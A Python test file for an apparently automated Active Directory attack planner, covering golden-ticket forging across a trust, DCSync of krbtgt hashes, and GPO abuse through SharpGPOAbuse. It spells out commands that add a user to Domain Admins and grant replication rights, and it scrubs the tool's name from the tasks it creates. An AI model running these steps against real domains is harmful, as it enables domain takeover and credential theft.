        objective="compromise trusted parent",
        footholds=[
            _foothold("north.sevenkingdoms.local", callback_id="4", agent="merlin"),
            _foothold("north.sevenkingdoms.local", callback_id="5", agent="apollo"),
        ],
        hops=[
            _hop("da:north.sevenkingdoms.local"),
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("kerberos-context:north.sevenkingdoms.local@callback:5"),
            _hop("da:sevenkingdoms.local"),
            _hop("krbtgt-hash:sevenkingdoms.local"),
        ],
    )
    state.hops[-1].evidence["callback_id"] = "5"

    contexts = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "ensure-kerberos-context"
    ]

    assert contexts
    assert contexts[0].target == "domain=sevenkingdoms.local;callback=5"
    assert all("callback=5" in action.target for action in contexts)


def test_multi_callback_context_frontier_falls_back_when_latest_callback_is_dead():
    state = es.EngagementState(
        objective="compromise trusted parent",
        footholds=[
            _foothold("north.sevenkingdoms.local", callback_id="4", agent="merlin"),
            _foothold("north.sevenkingdoms.local", callback_id="5", agent="apollo", alive=False),
        ],
        hops=[
            _hop("da:north.sevenkingdoms.local"),
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("kerberos-context:north.sevenkingdoms.local@callback:5"),
            _hop("da:sevenkingdoms.local"),
            _hop("krbtgt-hash:sevenkingdoms.local"),
        ],
    )
    state.hops[-1].evidence["callback_id"] = "5"

    contexts = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "ensure-kerberos-context"
    ]

    assert contexts
    assert all("callback=5" not in action.target for action in contexts)
    assert all("callback=4" in action.target for action in contexts)


def test_dcsync_uses_newest_live_current_context_when_multiple_callbacks_are_valid():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[
            _foothold("child.root.local", callback_id="4", agent="merlin"),
            _foothold("child.root.local", callback_id="5", agent="apollo"),
        ],
        hops=[
            _hop("krbtgt-hash:child.root.local"),
            _hop("da:root.local"),
            _hop("kerberos-context:root.local@callback:4"),
            _hop("kerberos-context:root.local@callback:5"),
        ],
    )

    dcsync = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "dcsync-krbtgt" and "root.local" in action.target
    ]

    assert len(dcsync) == 1
    assert "kerberos-context:root.local@callback:5" in dcsync[0].preconditions


def test_proven_context_lane_does_not_backfill_secondary_callback_before_downstream_work():
    state = es.EngagementState(
        objective="compromise trusted parent",
        footholds=[
            _foothold("north.sevenkingdoms.local", callback_id="4", agent="merlin"),
            _foothold("north.sevenkingdoms.local", callback_id="5", agent="apollo"),
        ],
        hops=[
            _hop("da:north.sevenkingdoms.local"),
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("kerberos-context:north.sevenkingdoms.local@callback:5"),
            _hop("da:sevenkingdoms.local"),
            _hop("krbtgt-hash:sevenkingdoms.local"),
            _hop("kerberos-context:sevenkingdoms.local@callback:5"),
        ],
        graph_facts=[_fact("credential-target:cersei.lannister@sevenkingdoms.local")],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(action.name == "ensure-kerberos-context" for action in actions)
    dcsync = [action for action in actions if action.name == "dcsync-account"]
    assert dcsync
    assert dcsync[0].target == "domain=sevenkingdoms.local;account=cersei.lannister"
    assert "kerberos-context:sevenkingdoms.local@callback:5" in dcsync[0].preconditions


def test_account_context_lane_does_not_backfill_secondary_callback_before_downstream_work():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[
            _foothold("lab.local", callback_id="4", agent="merlin"),
            _foothold("lab.local", callback_id="5", agent="apollo"),
        ],
        hops=[
            _hop("creds:alice@lab.local"),
            _hop("kerberos-account-context:alice@lab.local@callback:5"),
        ],
        graph_facts=[
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(action.name == "ensure-account-kerberos-context" for action in actions)
    reads = [action for action in actions if action.name == "read-managed-local-admin-secret"]
    assert reads
    assert reads[0].target.endswith("callback=5")


def test_sage_control_callback_is_not_a_target_tradecraft_callback():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[
            _foothold("sage", callback_id="1", agent="sage", identity="Sage"),
            _foothold(
                "north.sevenkingdoms.local",
                callback_id="2",
                agent="apollo",
                identity="NORTH\\samwell.tarly",
            ),
        ],
        hops=[
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("da:north.sevenkingdoms.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    contexts = [action for action in actions if action.name == "ensure-kerberos-context"]

    assert contexts
    assert all("callback=1" not in action.target for action in actions)
    assert all("live-callback:1" not in action.preconditions for action in actions)
    assert any(
        action.target == "domain=north.sevenkingdoms.local;callback=2"
        and action.intent["refresh_current_context"] is True
        for action in contexts
    )


def test_krbtgt_context_action_suppressed_when_callback_context_exists():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("krbtgt-hash:lab.local"),
            _hop("da:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
        ],
    )

    assert "ensure-kerberos-context" not in [
        action.name for action in capabilities.actions_from_state(state)
    ]


def test_child_krbtgt_unlocks_parent_sid_history_forge_action():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("north.sevenkingdoms.local")],
        hops=[
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
            _hop("da:north.sevenkingdoms.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)
    forge = [action for action in actions if action.name == "forge-golden-ticket"]

    assert len(forge) == 1
    assert forge[0].target == "domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local"
    assert forge[0].effects == ["da:sevenkingdoms.local"]
    assert forge[0].intent["target_domain"] == "sevenkingdoms.local"
    assert forge[0].intent["requires_extra_sids"] is True


def test_child_krbtgt_parent_forge_precedes_account_dcsync_side_quests():
    state = es.EngagementState(
        objective="compromise essos.local",
        footholds=[_foothold("north.sevenkingdoms.local", callback_id="3")],
        hops=[
            _hop("da:north.sevenkingdoms.local"),
            _hop("kerberos-context:north.sevenkingdoms.local@callback:3"),
            _hop("krbtgt-hash:north.sevenkingdoms.local"),
        ],
        graph_facts=[
            _fact("credential-target:arya.stark@north.sevenkingdoms.local"),
            _fact("credential-target:brandon.stark@north.sevenkingdoms.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert actions[0].name == "forge-golden-ticket"
    assert actions[0].target == "domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local"
    assert any(action.name == "dcsync-account" for action in actions[1:])


def test_verify_dcsync_secret_requires_real_secret_material():
    achieved = capabilities.verify_dcsync_secret({"krbtgt_hash_present": True})
    partial = capabilities.verify_dcsync_secret({"secretsdump_connected": True})
    blocked = capabilities.verify_dcsync_secret({"replication_access_denied": True})
    failed = capabilities.verify_dcsync_secret({})

    assert achieved.verdict == "achieved"
    assert partial.verdict == "partial"
    assert blocked.verdict == "blocked"
    assert failed.verdict == "failed"


def test_verify_forged_ticket_requires_usable_access_proof():
    achieved = capabilities.verify_forged_ticket({"ticket_valid": True})
    partial = capabilities.verify_forged_ticket({"ticket_forged": True})
    blocked = capabilities.verify_forged_ticket({"bad_krbtgt_key": True})
    failed = capabilities.verify_forged_ticket({})

    assert achieved.verdict == "achieved"
    assert partial.verdict == "partial"
    assert blocked.verdict == "blocked"
    assert failed.verdict == "failed"


def test_verify_kerberos_context_requires_callback_scoped_access_proof():
    achieved = capabilities.verify_kerberos_context({"service_access_proven": True, "callback_id": "13"})
    partial_missing_callback = capabilities.verify_kerberos_context({"service_access_proven": True})
    partial_staged = capabilities.verify_kerberos_context({"ticket_imported": True, "callback_id": "13"})
    blocked = capabilities.verify_kerberos_context({"access_denied": True, "callback_id": "13"})
    failed = capabilities.verify_kerberos_context({})

    assert achieved.verdict == "achieved"
    assert partial_missing_callback.verdict == "partial"
    assert partial_staged.verdict == "partial"
    assert blocked.verdict == "blocked"
    assert failed.verdict == "failed"


def test_probe_extractors_build_structured_capability_evidence():
    system_probe = capabilities.extract_gpo_system_exec_probe("whoami\nnt authority\\system")
    rights_probe = capabilities.extract_directory_rights_probe(
        graph_facts=[_fact("ds-replication-rights:lab.local")],
        domain="lab.local",
    )
    secret_probe = capabilities.extract_dcsync_secret_probe(
        "Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe"
    )

    assert capabilities.verify_gpo_controlled_system_exec(system_probe).verdict == "achieved"
    assert capabilities.verify_grant_directory_rights(rights_probe).verdict == "achieved"
    assert capabilities.verify_dcsync_secret(secret_probe).verdict == "achieved"


def test_gpo_system_exec_probe_marks_missing_proof_file_retryable():
    probe = capabilities.extract_gpo_system_exec_probe("The system cannot find the file specified.")
    verification = capabilities.verify_gpo_controlled_system_exec(probe)

    assert probe["proof_not_found"] is True
    assert verification.verdict == "partial"


def _assert_payload_agnostic_plan(plan):
    serialized = json.dumps(asdict(plan), sort_keys=True).casefold()
    for forbidden in (
        "execute_assembly",
        "assembly_name",
        "assembly_arguments",
        "apollo",
        "merlin",
        "mythic",
        "mimikatz",
    ):
        assert forbidden not in serialized


def test_build_gpo_system_exec_execution_plan_is_payload_agnostic():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    plan = capabilities.build_capability_execution_plan(action, {"allow_proof_only": True})

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "gpo-wait",
        "gpo-proof-read",
    ]
    step = plan.steps[0]
    assert step.operation == "gpo-computer-task"
    assert step.parameters["tool"] == "SharpGPOAbuse.exe"
    assert step.parameters["gpo"] == "workstation-policy"
    assert step.parameters["author"] == "NT AUTHORITY\\SYSTEM"
    assert step.parameters["command"] == "cmd.exe"
    assert step.parameters["arguments"] == r"/c whoami > C:\Users\Public\sage_gpo_workstation_policy_whoami.txt"
    assert step.parameters["force"] is True
    assert step.expected_probe == "extract_gpo_system_exec_probe"
    assert plan.steps[1].parameters["seconds"] == 300
    assert plan.steps[2].parameters["proof_path"] == r"C:\Users\Public\sage_gpo_workstation_policy_whoami.txt"
    _assert_payload_agnostic_plan(plan)


def test_build_gpo_system_exec_rejects_implicit_proof_only_action():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    plan = capabilities.build_capability_execution_plan(action)

    assert plan.ok is False
    assert plan.missing == ["system_action"]
    assert "allow_proof_only=true" in plan.reason


def test_build_gpo_system_exec_direct_plan_reads_back_structured_artifact_when_guid_known():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local;gpo_guid={0A93E998-2599-4DA8-9717-6744993DED3A}",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {"allow_proof_only": True})

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "structured-artifact-read",
        "gpo-wait",
        "gpo-proof-read",
    ]
    artifact = plan.steps[1]
    assert artifact.parameters["artifact_type"] == "xml"
    assert artifact.parameters["path"] == (
        r"\\lab.local\SYSVOL\lab.local\Policies\{0A93E998-2599-4DA8-9717-6744993DED3A}"
        r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    )
    assert artifact.expected_probe == "extract_gpo_system_exec_probe"
    _assert_payload_agnostic_plan(plan)


def test_structured_artifact_validator_rejects_malformed_xml():
    output = (
        r"\\lab.local\SYSVOL\lab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        "\n<ScheduledTasks><Task><Arguments>cmd.exe /c whoami && hostname</Arguments></Task></ScheduledTasks>"
    )

    probe = capabilities.extract_gpo_system_exec_probe(output)
    verification = capabilities.verify_gpo_controlled_system_exec(probe)

    assert probe["structured_artifact_observed"] is True
    assert probe["xml_invalid"] is True
    assert verification.verdict == "blocked"


def test_structured_artifact_validator_rejects_trailing_xml_documents():
    output = (
        '<ImmediateTaskV2 name="old"><Properties /></ImmediateTaskV2>'
        '<?xml version="1.0" encoding="utf-8"?>'
        '<ScheduledTasks><ImmediateTaskV2 name="new" /></ScheduledTasks>'
    )

    probe = capabilities.extract_gpo_system_exec_probe(output)
    verification = capabilities.verify_gpo_controlled_system_exec(probe)

    assert probe["structured_artifact_observed"] is True
    assert probe["xml_invalid"] is True
    assert "junk after document" in probe["xml_parse_error"].casefold()
    assert verification.verdict == "blocked"


def test_build_gpo_system_exec_fallback_plan_waits_without_unscoped_local_refresh():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-immediate-task-fallback",
        "gpo-wait",
        "gpo-proof-read",
    ]
    writer = plan.steps[0]
    assert writer.parameters["domain"] == "lab.local"
    assert writer.parameters["gpo"] == "workstation-policy"
    assert writer.parameters["command"] == "cmd.exe"
    assert writer.parameters["arguments"] == r"/c whoami > C:\Users\Public\sage_gpo_workstation_policy_whoami.txt"
    assert plan.steps[-1].parameters["proof_path"] == r"C:\Users\Public\sage_gpo_workstation_policy_whoami.txt"
    assert all(step.expected_probe == "extract_gpo_system_exec_probe" for step in plan.steps)
    _assert_payload_agnostic_plan(plan)


def test_build_gpo_system_exec_fallback_uses_redirect_path_for_proof_read():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local",
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "arguments": r"/c whoami > \\lab.local\SYSVOL\lab.local\Policies\{GUID}\proof.txt 2>&1",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
    })

    assert plan.ok is True
    proof_reads = [step for step in plan.steps if step.operation == "gpo-proof-read"]
    assert proof_reads
    assert proof_reads[0].parameters["proof_path"] == (
        r"\\lab.local\SYSVOL\lab.local\Policies\{GUID}\proof.txt"
    )


def test_build_gpo_system_exec_plan_accepts_command_aliases():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" LAB\alice /add /domain',
    })

    assert plan.ok is True
    writer = plan.steps[0]
    assert writer.parameters["command"] == "cmd.exe"
    assert writer.parameters["arguments"] == r'/c net group "Domain Admins" alice /add /domain'
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "gpo-wait",
        "gpo-domain-admin-membership-proof",
    ]
    assert plan.steps[-1].expected_probe == "extract_gpo_domain_admin_membership_probe"


def test_build_gpo_system_exec_plan_accepts_gpo_and_wait_aliases():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="domain=lab.local",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo_name": "Workstation Policy",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
        "dc_refresh_wait_seconds": 7,
    })

    assert plan.ok is True
    assert plan.steps[0].parameters["gpo"] == "workstation policy"
    assert plan.steps[0].parameters["ldap_server"] == ""
    assert plan.steps[1].operation == "gpo-wait"
    assert plan.steps[1].parameters["seconds"] == 7
    _assert_payload_agnostic_plan(plan)


def test_build_gpo_system_exec_plan_uses_affected_dc_as_ldap_server_and_gp_wait_alias():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=workstation-policy;domain=lab.local",
        preconditions=["generic-write:gpo:workstation-policy"],
        effects=["system-exec:gpo:workstation-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "workstation-policy",
            "affected_dc_hosts": ["dc01"],
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
        "gp_refresh_wait_seconds": 11,
    })

    assert plan.ok is True
    assert plan.steps[0].parameters["ldap_server"] == "dc01.lab.local"
    assert [step.operation for step in plan.steps][:2] == ["gpo-immediate-task-fallback", "gpo-wait"]
    assert plan.steps[1].parameters["seconds"] == 11
    _assert_payload_agnostic_plan(plan)


def test_build_gpo_system_exec_fallback_skips_local_refresh_when_callback_host_is_not_affected():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=dc-policy;domain=lab.local",
        preconditions=["generic-write:gpo:dc-policy"],
        effects=["system-exec:gpo:dc-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "dc-policy",
            "affected_dc_hosts": ["dc01"],
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
        "current_host": "workstation01.lab.local",
        "wait_seconds": 11,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-immediate-task-fallback",
        "gpo-wait",
        "gpo-proof-read",
    ]
    assert plan.steps[1].parameters["seconds"] == 11


def test_build_gpo_system_exec_fallback_allows_local_refresh_when_callback_host_is_affected():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=dc-policy;domain=lab.local",
        preconditions=["generic-write:gpo:dc-policy"],
        effects=["system-exec:gpo:dc-policy@lab.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo": "dc-policy",
            "affected_dc_hosts": ["dc01"],
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
        "current_host": "DC01.lab.local",
        "wait_seconds": 11,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps][:3] == [
        "gpo-immediate-task-fallback",
        "gpo-refresh-local",
        "gpo-wait",
    ]


def test_dc_scoped_gpo_defaults_to_primary_domain_admin_group_add():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local", "da:north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "affected_dc_hosts": ["winterfell"],
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "controlled_principal": r"NORTH\samwell.tarly",
        "command": "cmd.exe",
        "arguments": r"/c whoami > C:\Users\Public\wrong-proof.txt",
        "wait_seconds": 5,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "gpo-wait",
        "gpo-domain-admin-membership-proof",
    ]
    assert plan.steps[0].parameters["tool"] == "SharpGPOAbuse.exe"
    assert plan.steps[0].parameters["task_name"] == "GPOStarkwallpaperDomainAdminSamwellTarly"
    assert re.fullmatch(r"[A-Za-z0-9]+", plan.steps[0].parameters["task_name"])
    assert "sage" not in plan.steps[0].parameters["task_name"].casefold()
    assert plan.steps[0].parameters["command"] == "cmd.exe"
    assert plan.steps[0].parameters["arguments"] == r'/c net group "Domain Admins" samwell.tarly /add /domain'
    assert plan.steps[2].parameters["principal"] == "samwell.tarly"


def test_target_dc_gpo_group_add_overrides_requested_fallback_to_primary():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "target_dc": "winterfell.north.sevenkingdoms.local",
        "gpo_guid": "{0a93e998-2599-4da8-9717-6744993ded3a}",
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
        "wait_seconds": 300,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "structured-artifact-read",
        "gpo-wait",
        "gpo-domain-admin-membership-proof",
    ]
    writer = plan.steps[0]
    assert writer.parameters["tool"] == "SharpGPOAbuse.exe"
    assert writer.parameters["task_name"] == "GPOStarkwallpaperDomainAdminSamwellTarly"
    assert re.fullmatch(r"[A-Za-z0-9]+", writer.parameters["task_name"])
    assert "sage" not in writer.parameters["task_name"].casefold()
    assert writer.parameters["arguments"] == r'/c net group "Domain Admins" samwell.tarly /add /domain'
    assert "gpo-refresh-local" not in [step.operation for step in plan.steps]


def test_gpo_task_name_sanitizes_explicit_operator_value():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "task_name": "Sage-GPO_starkwallpaper/domain-admin#samwell.tarly",
        "target_dc": "winterfell",
        "command": "cmd.exe",
        "arguments": r'/c net group "Domain Admins" samwell.tarly /add /domain',
    })

    assert plan.ok is True
    task_name = plan.steps[0].parameters["task_name"]
    assert task_name == "GPOStarkwallpaperDomainAdminSamwellTarly"
    assert re.fullmatch(r"[A-Za-z0-9]+", task_name)
    assert "sage" not in task_name.casefold()


def test_dc_scoped_gpo_allows_fallback_only_after_primary_failure():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local", "da:north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
            "affected_dc_hosts": ["winterfell"],
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "controlled_principal": r"NORTH\samwell.tarly",
        "primary_failure_observed": True,
        "wait_seconds": 5,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-immediate-task-fallback",
        "gpo-wait",
        "gpo-domain-admin-membership-proof",
    ]
    assert plan.steps[0].parameters["arguments"] == r'/c net group "Domain Admins" samwell.tarly /add /domain'


def test_gpo_redirection_proof_marker_rewrites_to_durable_group_add_without_allow_proof_only():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "controlled_principal": r"NORTH\samwell.tarly",
        "command": "cmd.exe",
        "arguments": r"/c whoami > C:\Users\Public\starkwallpaper_system_proof.txt",
        "proof_path": r"C:\Users\Public\starkwallpaper_system_proof.txt",
        "wait_seconds": 5,
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "gpo-computer-task",
        "gpo-wait",
        "gpo-domain-admin-membership-proof",
    ]
    writer = plan.steps[0]
    assert writer.parameters["tool"] == "SharpGPOAbuse.exe"
    assert writer.parameters["command"] == "cmd.exe"
    assert writer.parameters["arguments"] == r'/c net group "Domain Admins" samwell.tarly /add /domain'
    assert ">" not in writer.parameters["arguments"]


def test_gpo_redirection_proof_marker_fails_closed_without_controlled_principal():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
        preconditions=["generic-write:gpo:starkwallpaper"],
        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "north.sevenkingdoms.local",
            "gpo": "starkwallpaper",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "command": "cmd.exe",
        "arguments": r"/c whoami > C:\Users\Public\starkwallpaper_system_proof.txt",
        "proof_path": r"C:\Users\Public\starkwallpaper_system_proof.txt",
    })

    assert plan.ok is False
    assert plan.missing == ["controlled_principal"]
    assert "proof-only diagnostics" in plan.reason


def test_build_gpo_system_exec_plan_accepts_guid_without_gpo_name():
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="domain=lab.local",
        preconditions=["generic-write:gpo:unknown"],
        effects=[],
        intent={
            "capability": "gpo-controlled-system-exec",
            "domain": "lab.local",
            "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "method": "gpp-immediate-task-fallback",
        "allow_proof_only": True,
    })

    assert plan.ok is True
    assert plan.steps[0].parameters["gpo"] == "0a93e998-2599-4da8-9717-6744993ded3a"
    assert plan.steps[0].parameters["gpo_guid"] == "{0A93E998-2599-4DA8-9717-6744993DED3A}"
    _assert_payload_agnostic_plan(plan)


def test_build_gpo_system_exec_plan_strips_netbios_only_for_net_group_domain_add():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        graph_facts=[
            _fact("generic-write:gpo:workstation-policy"),
            _fact("gpo-domain:workstation-policy:lab.local"),
        ],
    )
    action = capabilities.actions_from_state(state)[0]

    plan = capabilities.build_capability_execution_plan(action, {
        "command": "cmd.exe",
        "arguments": r'/c net.exe group "Domain Admins" "LAB\alice" /domain /add',
    })

    assert plan.ok is True
    assert plan.steps[0].parameters["arguments"] == r'/c net.exe group "Domain Admins" "alice" /domain /add'


def test_build_grant_directory_rights_requires_principal():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")

    plan = capabilities.build_capability_execution_plan(action)

    assert plan.ok is False
    assert plan.missing == ["principal"]
    assert plan.steps == []


def test_build_grant_directory_rights_gpo_task_plan_uses_standin_guids():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")

    plan = capabilities.build_capability_execution_plan(action, {"principal": "LAB\\operator"})

    assert plan.ok is True
    assert len(plan.steps) == 4
    grant_steps = plan.steps[:3]
    verify_step = plan.steps[3]
    assert {step.operation for step in grant_steps} == {"gpo-computer-task"}
    assert all(step.parameters["tool"] == "SharpGPOAbuse.exe" for step in grant_steps)
    assert all(step.parameters["command"] == r"C:\Windows\Temp\StandIn.exe" for step in grant_steps)
    joined = "\n".join(step.parameters["arguments"] for step in grant_steps)
    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in joined
    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" in joined
    assert "--object DC=lab,DC=local --grant LAB\\operator --guid 89e95b76-444d-4c62-991a-0facbeda640c" in joined
    assert all(step.prerequisites for step in grant_steps)
    assert verify_step.operation == "ldap-acl-read"
    assert verify_step.parameters == {
        "tool": "StandIn.exe",
        "target_dn": "DC=lab,DC=local",
        "ntacl": True,
    }
    _assert_payload_agnostic_plan(plan)


def test_build_grant_directory_rights_direct_plan_is_ldap_primitives():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("system-exec:gpo:workstation-policy@lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "grant-directory-rights")

    plan = capabilities.build_capability_execution_plan(action, {
        "principal": "LAB\\operator",
        "execution_method": "direct",
    })

    assert plan.ok is True
    assert len(plan.steps) == 4
    first = plan.steps[0]
    assert first.operation == "ldap-extended-right-grant"
    assert first.parameters["tool"] == "StandIn.exe"
    assert first.parameters["target_dn"] == "DC=lab,DC=local"
    assert first.parameters["principal"] == "LAB\\operator"
